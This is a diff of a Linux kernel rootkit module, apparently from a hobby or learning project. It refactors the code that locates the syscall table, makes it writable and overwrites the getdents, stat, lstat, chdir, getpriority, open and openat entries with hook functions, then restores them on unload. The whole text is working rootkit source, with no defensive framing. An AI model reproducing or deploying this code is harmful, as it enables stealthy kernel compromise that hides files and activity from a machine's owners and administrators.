@@ -41,7 +41,12 @@ struct linux_dirent64 {
 unsigned long *syscall_table = NULL;
 
 // HOOK DEFINING MACROS ---------------------------------------------
-//similar to how kernel defines syscalls using SYSCALL_DEFINEx
+#define sys_orig(name) sys_##name##_orig
+#define sys_hook(name) sys_##name##_hook
+#define sys_do_hook(name) sys_##name##_do_hook
+#define sys_num(name) __NR_##name
+#define sys_define(name_mayus) HOOK_##name_mayus
+
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) //pt_regs struct for args, kernel >= 4.17
 //similar to how kernel defines __MAP in syscalls.h
 #define args1 regs->di
@@ -63,12 +68,21 @@ unsigned long *syscall_table = NULL;
 #define ARGS_DO_HOOK(n_args, ...) ARGS_ORIG(n_args, __VA_ARGS__), NULL //regs is null, as these kernel versions do not use it
 #endif
 
-#define hook_define(n_args, ret_type, syscall_name, ...)                                               \
-	asmlinkage ret_type sys_##syscall_name##_do_hook(DECL_DO_HOOK(n_args, __VA_ARGS__));               \
-	asmlinkage ret_type (*sys_##syscall_name##_orig)(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
-	asmlinkage ret_type sys_##syscall_name##_hook(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
-		return sys_##syscall_name##_do_hook(ARGS_DO_HOOK(n_args, __VA_ARGS__));                        \
+//similar to how kernel defines syscalls using SYSCALL_DEFINEx
+#define hook_define(n_args, ret_type, name, ...)                                            \
+	asmlinkage ret_type sys_do_hook(name)(DECL_DO_HOOK(n_args, __VA_ARGS__));               \
+	asmlinkage ret_type (*sys_orig(name))(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
+	asmlinkage ret_type sys_hook(name)(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
+		return sys_do_hook(name)(ARGS_DO_HOOK(n_args, __VA_ARGS__));                        \
 	}
+
+
+#define perform_hook(name, name_mayus) \
+	sys_orig(name) = (void*)syscall_table[sys_num(name)]; \
+	if (sys_define(name_mayus)) syscall_table[sys_num(name)] = sys_hook(name);
+
+#define disable_hook(name, name_mayus) \
+	if (sys_define(name_mayus)) syscall_table[sys_num(name)] = sys_orig(name);
 // END HOOK DEFINING MACROS -----------------------------------------
 
 hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
@@ -247,36 +261,6 @@ asmlinkage long sys_openat_do_hook(int dfd, const char __user *pathname, int fla
 	return sys_openat_orig(ARGS_ORIG(4, int, dfd, const char __user*, pathname, int, flags, umode_t, mode));
 }
 
-// TESTING ------------------------------------
-//NOT TESTED YET
-//THIS WON'T WORK
-#define sys_orig(name) sys_##name##_orig
-#define sys_hook(name) sys_##name##_hook
-#define sys_num(name) __NR_##name
-#define sys_define(name) HOOK_##name //problem: mayus
-
-int n_hooks = 2;
-char[][] hooks = {"getdents", "getdents64", ...}
-void perform_hooks(void){
-	ENABLE_WRITE();
-	for (int i = 0; i < n_hooks; i++){
-		if (!sys_define(hooks[i])) continue;
-		sys_orig(hooks[i]) = (void*)syscall_table[sys_num(hooks[i])];
-		syscall_table[sys_num(hooks[i])] = sys_hook(hooks[i]);
-	}
-	DISABLE_WRITE();
-}
-
-void disable_hooks(void){
-	ENABLE_WRITE();
-	for (int i = 0; i < n_hooks; i++){
-		if (!sys_define(hooks[i])) continue;
-		syscall_table[sys_num(hooks[i])] = sys_orig(hooks[i]);
-	}
-	DISABLE_WRITE();
-}
-// END TESTING --------------------------------
-
 
 //__init para que solo lo haga una vez y después pueda sacarlo de memoria
 int __init hooks_init(void){
@@ -287,25 +271,16 @@ int __init hooks_init(void){
 	printk(KERN_INFO "ROOTKIT: Syscall table found at %lx\n", (long unsigned int)syscall_table);
 	printk(KERN_INFO "ROOTKIT: Starting hooks\n");
 
-	sys_getdents_orig = (void*)syscall_table[__NR_getdents];
-	sys_getdents64_orig = (void*)syscall_table[__NR_getdents64];
-	sys_stat_orig = (void*)syscall_table[__NR_stat];
-	sys_lstat_orig = (void*)syscall_table[__NR_lstat];
-	sys_chdir_orig = (void*)syscall_table[__NR_chdir];
-	sys_getpriority_orig = (void*)syscall_table[__NR_getpriority];
-	sys_open_orig = (void*)syscall_table[__NR_open];
-	sys_openat_orig = (void*)syscall_table[__NR_openat];
-
-	ENABLE_WRITE(); //there must be a way to do this better
-	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_hook;
-	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_hook;
-	if (HOOK_STAT) syscall_table[__NR_stat] = sys_stat_hook;
-	if (HOOK_LSTAT) syscall_table[__NR_lstat] = sys_lstat_hook;
-	if (HOOK_CHDIR) syscall_table[__NR_chdir] = sys_chdir_hook;
-	if (HOOK_GETPRIORITY) syscall_table[__NR_getpriority] = sys_getpriority_hook;
-	if (HOOK_OPEN) syscall_table[__NR_open] = sys_open_hook;
-	if (HOOK_OPENAT) syscall_table[__NR_openat] = sys_openat_hook;
-	DISABLE_WRITE();
+	ENABLE_WRITE() //there must be a way to do this better
+	perform_hook(getdents, GETDENTS)
+	perform_hook(getdents64, GETDENTS64)
+	perform_hook(stat, STAT)
+	perform_hook(lstat, LSTAT)
+	perform_hook(chdir, CHDIR)
+	perform_hook(getpriority, GETPRIORITY)
+	perform_hook(open, OPEN)
+	perform_hook(openat, OPENAT)
+	DISABLE_WRITE()
 
 	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
 	return 0;
@@ -313,16 +288,16 @@ int __init hooks_init(void){
 
 
 void __exit hooks_exit(void){
-	ENABLE_WRITE();
-	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_orig;
-	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_orig;
-	if (HOOK_STAT) syscall_table[__NR_stat] = sys_stat_orig;
-	if (HOOK_LSTAT) syscall_table[__NR_lstat] = sys_lstat_orig;
-	if (HOOK_CHDIR) syscall_table[__NR_chdir] = sys_chdir_orig;
-	if (HOOK_GETPRIORITY) syscall_table[__NR_getpriority] = sys_getpriority_orig;
-	if (HOOK_OPEN) syscall_table[__NR_open] = sys_open_orig;
-	if (HOOK_OPENAT) syscall_table[__NR_openat] = sys_openat_orig;
-	DISABLE_WRITE();
+	ENABLE_WRITE()
+	disable_hook(getdents, GETDENTS)
+	disable_hook(getdents64, GETDENTS64)
+	disable_hook(stat, STAT)
+	disable_hook(lstat, LSTAT)
+	disable_hook(chdir, CHDIR)
+	disable_hook(getpriority, GETPRIORITY)
+	disable_hook(open, OPEN)
+	disable_hook(openat, OPENAT)
+	DISABLE_WRITE()
 
 	// delete lists
 	struct list_files_node *node_file, *tmp_file;
